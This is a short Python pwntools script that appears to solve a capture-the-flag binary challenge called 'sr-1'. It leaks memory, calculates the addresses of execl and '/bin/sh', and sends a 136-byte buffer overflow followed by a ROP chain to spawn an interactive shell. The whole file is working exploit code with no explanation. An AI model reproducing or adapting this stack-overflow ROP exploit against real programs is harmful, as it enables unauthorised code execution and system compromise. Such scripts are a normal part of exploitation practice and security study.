#!/usr/bin/env python

from pwn import *

p = process("./sr-1")
p.sendline("1600")

raw_data = p.recv()
raw_data = raw_data.split("print?\n")[1]
raw_data = raw_data.split("Please")[0]
hex_arr = []
for i in range(0,len(raw_data),8):
    s = raw_data[i:i+8]
    s2 = u64(s)
    hex_arr.append(hex(s2))

execl = int(hex_arr[23],16) - 48955
binsh_addr = (int(hex_arr[-103],16) - 2347689) +5 # adding 5: "/bin/sh" --> "sh"
execl = binsh_addr - 787255
#ROP Gadgets

#0x0000000000400783 : pop rdi ; ret
#0x0000000000400781 : pop rsi ; pop r15 ; ret


print("sh --  " + str(hex(binsh_addr)))
print("execl -- " + str(hex(execl)))

rdi_ret = p64(0x0000000000400783)
rsi_r15_ret = p64(0x0000000000400781)
zeros = p64(0)

buffer = "A"*136
buffer += rdi_ret + p64(binsh_addr)
buffer += rsi_r15_ret + zeros*2
buffer += p64(execl)

p.sendline(buffer)
p.interactive()

"""

"""
